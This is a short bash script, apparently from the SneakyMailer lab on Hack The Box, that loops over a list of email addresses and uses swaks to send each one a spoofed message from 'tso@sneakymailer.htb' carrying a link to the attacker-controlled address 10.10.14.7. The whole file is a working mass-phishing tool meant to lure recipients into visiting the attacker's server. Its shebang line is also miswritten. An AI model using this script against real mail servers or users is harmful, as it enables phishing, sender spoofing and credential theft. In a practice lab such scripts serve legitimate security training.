#/bin/bash

for email in $(cat email.txt |tr '\n' ',')
do
	swaks --from tso@sneakymailer.htb --to $email  --header "Subject: test" --body "http://10.10.14.7/" --server 10.10.10.197
done
